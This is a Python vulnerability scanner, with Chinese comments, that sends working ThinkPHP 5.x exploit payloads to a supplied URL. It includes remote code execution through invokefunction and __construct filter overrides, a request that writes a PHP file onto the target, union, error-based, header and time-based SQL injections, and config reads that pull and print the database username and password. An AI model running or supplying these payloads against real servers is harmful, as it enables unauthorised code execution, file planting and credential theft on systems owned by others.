# -*- coding: utf-8 -*-
from bs4 import BeautifulSoup
import requests
import re
from urllib.parse import urlparse
import time
from colorama import Fore, init
import urllib3
from urllib3.exceptions import InsecureRequestWarning


urllib3.disable_warnings(InsecureRequestWarning)
headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
    }

# 检测是否有该漏洞
class Check:

    def __init__(self, url):
        self.url = url
        self.checkresult = {}

    def exec(self):
        self.check_url()
        return self.checkresult

    # 遍历打payload
    def check_url(self):
        check_method = [
            "check_5_x_route_rce",
            "check_5_0_x_db",
            "check_5_x_construct_rce",
            "check_5_x_construct_other",
            "check_5_x_sql",
            "check_5_x_xff_sql",
            "check_5_x_time_sql",
            "check_5_x_driver_rce",
            "check_5_x_showid_rce",
            "check_5_x_request_input_rce",
            "check_5_x_template_driver_rce",
            "check_5_x_cache_rce",
            "check_5_x_ids_sql",
            "check_5_x_orderid_sql",
            "check_5_x_update_sql"

        ]
        for method in check_method:
            if method == "check_5_x_route_rce":
                self.check_5_x_route_rce_get()
            elif method == "check_5_0_x_db":
                self.check_5_0_x_db()
            elif method == "check_5_x_construct_rce":
                self.check_5_x_construct_rce()
            elif method == "check_5_x_construct_other":
                self.check_5_x_construct_other()
            elif method == "check_5_x_sql":
                self.check_5_x_sql()
            elif method == "check_5_x_xff_sql":
                self.check_5_x_xff_sql()
            elif method == "check_5_x_time_sql":
                self.check_5_x_time_sql()
            # elif method == "check_5_x_driver_rce":
            #     self.check_5_x_driver_rce()
            elif method == "check_5_x_showid_rce":
                self.check_5_x_showid_rce()
            elif method == "check_5_x_request_input_rce":
                self.check_5_x_request_input_rce()
            elif method == "check_5_x_template_driver_rce":
                self.check_5_x_template_driver_rce()
            elif method == "check_5_x_cache_rce":
                self.check_5_x_cache_rce()
            elif method == "check_5_x_ids_sql":
                self.check_5_x_ids_sql()
            elif method == "check_5_x_orderid_sql":
                self.check_5_x_orderid_sql()
            elif method == "check_5_x_update_sql":
                self.check_5_x_update_sql()

    # thinkphp5.0.x路由过滤不严谨rce漏洞
    def check_5_x_route_rce_get(self):
        pocs = [
            "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            "?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

        ]
        checkresult = {}
        # proxy = {
        #     "http":"127.0.0.1:8080"
        # }

        try:
            for poc in pocs:
                payload = self.url + "/index.php" + poc
                res = requests.get(payload, headers=headers, timeout=10, verify=False)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_route_rce_get"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5.0.x路由过滤不严谨rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")
            print(e)

    def check_5_x_construct_rce(self):
        try:
            checkresult = {}
            pocs = [
                "_method=__construct&filter[]=phpinfo&method=GET&get[]=1",
                "s=1&_method=__construct&method=POST&filter[]=phpinfo",
                "aaaa=1&_method=__construct&method=GET&filter[]=phpinfo",
                "c=phpinfo&f=1&_method=filter",
                "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1"
            ]
            poc_url = self.url + "/index.php?s=index"
            for poc in pocs:
                res = requests.post(poc_url, data=poc, headers=headers, timeout=10, verify=False)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_construct_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5.x路由过滤不严谨rce漏洞(post型)\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")
            print(e)

    # def check_5_x_driver_rce(self):
    #     pocs = [
    #         "?s=index/think\\view\\driver\\Php/display&content=<?php phpinfo();?>",
    #         "?s=index/\\think\\view\\driver\\Php/display&content=<?php phpinfo();?>"
    #     ]
    #     checkresult = {}
    #     try:
    #         for poc in pocs:
    #             payload = self.url + poc
    #             res = requests.get(payload, headers=headers)
    #             bs = BeautifulSoup(res.text, 'html.parser')
    #             verify = bs.find_all('h1')
    #             for row in verify:
    #                 rows = re.match("PHP Version", row.text)
    #                 if rows != None:
    #                     self.poc = poc
    #                     self.poc_method = "tp5_driver_rce"
    #                     checkresult[self.poc_method] = self.poc
    #                     self.check_poc()
    #                     break
    #                 else:
    #                     continue
    #             if checkresult:
    #                 self.checkresult = {**self.checkresult, **checkresult}
    #                 break
    #         else:
    #             print("[-] {0} 不存在thinkphp5_driver_rce漏洞\n".format(self.url))
    #     except Exception as e:
    #         print("[-] 请求失败!\n")

    def check_5_x_showid_rce(self):
        pocs = [
            "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~phpinfo()}]"
        ]
        checkresult = {}
        try:
            for poc in pocs:
                payload = self.url + "/index.php" + poc
                res = requests.get(payload, headers=headers, timeout=10, verify=False)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_showid_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5_showid_rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_request_input_rce(self):
        pocs = [
            "?s=index/\\think\\Request/input&filter=phpinfo&data=1",
            "?s=index/think\\Request/input&filter=phpinfo&data=1"
        ]
        checkresult = {}
        try:
            for poc in pocs:
                payload = self.url + poc
                res = requests.get(payload, headers=headers, timeout=10, verify=False)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_request_input_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5_request_input_rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    # thinkphp5 __construct覆盖变量rce
    def check_5_x_construct_other(self):
        try:
            checkresult = {}
            pocs = [
                "_method=__construct&filter[]=phpinfo&method=GET&get[]=1",
                "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
                "s=1&_method=__construct&method=POST&filter[]=phpinfo"
            ]
            poc_url = self.url + "/index.php?s=captcha"
            for poc in pocs:
                res = requests.post(poc_url, data=poc, headers=headers, timeout=10, verify=False)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_construct_other"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5.x_captcha_rce漏洞(post型)\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_template_driver_rce(self):
        try:
            checkresult = {}
            pocs = [
                "?s=index/\\think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>",
                "?s=index/think\\template\\driver\\file/write&cacheFile=iceberg.php&content=<?php phpinfo();?>"
            ]
            for poc in pocs:
                payload = self.url + "/index.php" + poc
                res = requests.get(payload, headers=headers, timeout=10, verify=False)
                if res.status_code == 200:
                    host = urlparse(self.url).hostname + ":" + str(urlparse(self.url).port) + "/iceberg.php"
                    res = requests.get(host, headers=headers, timeout=10, verify=False)
                    if res.status_code == 200:
                        self.poc = poc
                        self.poc_method = "tp5_template_driver_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                else:
                    continue
            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_template_driver漏洞\n".format(self.url))
        except Exception as e:
            print("[-] {0} 不存在thinkphp5.x_template_driver漏洞\n".format(self.url))

    def check_5_x_lite_code_rce(self):
        pocs = [
            "/index.php/module/action/param1/${@print(var_dump(iceberg))}"
        ]
        checkresult = {}
        try:
            for poc in pocs:
                payload = self.url + poc
                res = requests.get(payload, headers=headers, timeout=10, verify=False)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_lite_code_rce"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue
                if checkresult:
                    self.checkresult = {**self.checkresult, **checkresult}
                    break
            else:
                print("[-] {0} 不存在thinkphp5_lite_code_rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_cache_rce(self):
        try:
            checkresult = {}
            pocs = [
                "%0d%0aphpinfo();%0d%0a//"
            ]
            poc_url = self.url + "/index.php/Home/Index/index.html"
            # proxies = {"127.0.0.1:8080"}
            for poc in pocs:
                res = requests.post(poc_url, data=poc, headers=headers, timeout=10, verify=False)
                bs = BeautifulSoup(res.text, 'html.parser')
                verify = bs.find_all('h1')
                for row in verify:
                    rows = re.match("PHP Version", row.text)
                    if rows != None:
                        self.poc = poc
                        self.poc_method = "tp5_construct_other"
                        checkresult[self.poc_method] = self.poc
                        self.check_poc()
                        break
                    else:
                        continue

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_cache_rce漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")
            print(e)

        # thinkphp5.0.x数据库泄露

    def check_5_0_x_db(self):
        checkresult = {}
        pocs = [
            "?s=index/think\\config/get&name=database.username",
            "?s=index/think\\config/get&name=database.password"
        ]
        try:
            payload_usr = self.url + pocs[0]
            payload_pwd = self.url + pocs[1]
            res_usr = requests.get(payload_usr, headers=headers, timeout=10, verify=False)
            res_pwd = requests.get(payload_pwd, headers=headers, timeout=10, verify=False)
            if res_usr.status_code == 200:
                self.dbusr = res_usr.text
                self.dbpwd = res_pwd.text
                self.poc = pocs[0]
                self.poc_method = "tp5_db"
                checkresult[self.poc_method] = self.poc
                self.checkresult = {**self.checkresult, **checkresult}
                self.check_poc()
            else:
                print("[-] {0} 不存在thinkphp5.x数据库泄露漏洞\n".format(self.url))

        except Exception as e:
            print("[-] 请求失败!\n")

    # thinkphp5sql注入漏洞
    def check_5_x_sql(self):

        try:
            checkresult = {}
            pocs = [
                "?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/HEX('iceberg')--+",
                "?ids[0,UpdAtexml(0,ConcAt(0xa,HEX('iceberg')),0)]=1"
            ]

            for poc in pocs:
                poc_url = self.url + poc
                res = requests.get(poc_url, headers=headers, timeout=10, verify=False)
                bs = BeautifulSoup(res.text, 'html.parser')
                if r"69636562657267" in bs:
                    self.poc = poc
                    self.poc_method = "tp5_sql"
                    checkresult[self.poc_method] = self.poc
                    self.check_poc()
                    break
                else:
                    continue

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.xSQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")
            print(e)

    def check_5_x_xff_sql(self):
        try:
            checkresult = {}
            headers = {
                'Content-Type': "application/x-www-form-urlencoded",
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
                'X-Forwarded-For': "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/HEX('iceberg'))))#"
            }
            self.headers = headers
            poc_url = self.url + "/index.php?s=/home/article/view_recent/name/1"
            res = requests.get(poc_url, headers=self.headers, timeout=10, verify=False)
            bs = BeautifulSoup(res.text, 'html.parser')
            if "69636562657267" in bs:
                self.poc = "X-Forwarded-For: 1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/HEX('iceberg'))))#"
                self.poc_method = "tp5_xff_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.xXFF头SQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_time_sql(self):
        try:
            checkresult = {}
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                "DNT": "1",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Content-Type": "multipart/form-data; boundary=--------546983569",
                "Accept-Encoding": "gzip, deflate, sdch",
                "Accept-Language": "zh-CN,zh;q=0.8",
            }
            payload = "----------546983569\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(10)#\r\n\r\n----------546983569--"
            self.headers = headers
            poc_url = self.url + "/index.php?s=/home/user/checkcode/"
            start_time = time.time()
            res = requests.post(poc_url, data=payload, headers=self.headers, timeout=10, verify=False)
            if time.time() - start_time >= 10:
                self.poc = payload
                self.poc_method = "tp5_time_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x时间注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_ids_sql(self):
        try:
            checkresult = {}
            payload = "?ids[0,UpdAtexml(0,ConcAt(0xa,HEX(iceberg)),0)]=1"
            poc_url = self.url + "/index.php" + payload
            res = requests.get(poc_url, headers=headers, timeout=10, verify=False)
            if "69636562657267" in res.text:
                self.poc = payload
                self.poc_method = "tp5_ids_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_ids_SQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_orderid_sql(self):
        try:
            checkresult = {}
            payload = "?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/HEX('iceberg')--+"
            poc_url = self.url + "/index.php" + payload
            res = requests.get(poc_url, headers=headers, timeout=10, verify=False)
            if "69636562657267" in res.text:
                self.poc = payload
                self.poc_method = "tp5_orderid_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_orderid_SQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    def check_5_x_update_sql(self):
        try:
            checkresult = {}
            payload = "?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20HEX('iceberg')),0x7e),1))"
            poc_url = self.url + "/index.php" + payload
            res = requests.get(poc_url, headers=headers, timeout=10, verify=False)
            if "69636562657267" in res.text:
                self.poc = payload
                self.poc_method = "tp5_update_sql"
                checkresult[self.poc_method] = self.poc
                self.check_poc()
            else:
                pass

            if checkresult:
                self.checkresult = {**self.checkresult, **checkresult}
            else:
                print("[-] {0} 不存在thinkphp5.x_update_SQL注入漏洞\n".format(self.url))
        except Exception as e:
            print("[-] 请求失败!\n")

    # 输出存在漏洞及payload
    def check_poc(self):
        init(autoreset=True)
        if self.poc_method == "tp5_route_rce_get":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x路由过滤不严谨rce漏洞\npayload: {1}".format(self.url, self.url + self.poc))
        elif self.poc_method == "tp5_construct_rce":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x__construct参数变量覆盖rce漏洞\npayload: POST ?s=index {1}".format(self.url, self.poc))
        # elif self.poc_method == "tp5_driver_rce":
        #     print("[+] {0} 存在thinkphp5.x_driver_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_construct_other":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x路由过滤不严谨rce漏洞(post型)\npayload: POST ?s=captcha {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_showid_rce":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x_showid_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_request_input_rce":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x_request_input_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_cache_rce":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x_cache_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_lite_code_rce":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x_lite_code_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_db":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.0.x数据库泄露\npayload: {1}\n数据库用户名: {2}\n数据库密码: {3}".format(self.url, self.url + self.poc, self.dbusr, self.dbpwd))
        elif self.poc_method == "tp5_sql":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.xSQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_xff_sql":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.xXFF头SQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_time_sql":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x时间注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_template_driver_rce":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x_template_driver_rce漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_ids_sql":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x_ids_SQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_orderid_sql":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x_orderid_SQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        elif self.poc_method == "tp5_update_sql":
            print(Fore.GREEN + "[+] {0} 存在thinkphp5.x_update_SQL注入漏洞\npayload: {1}".format(self.url, self.poc))
        else:
            pass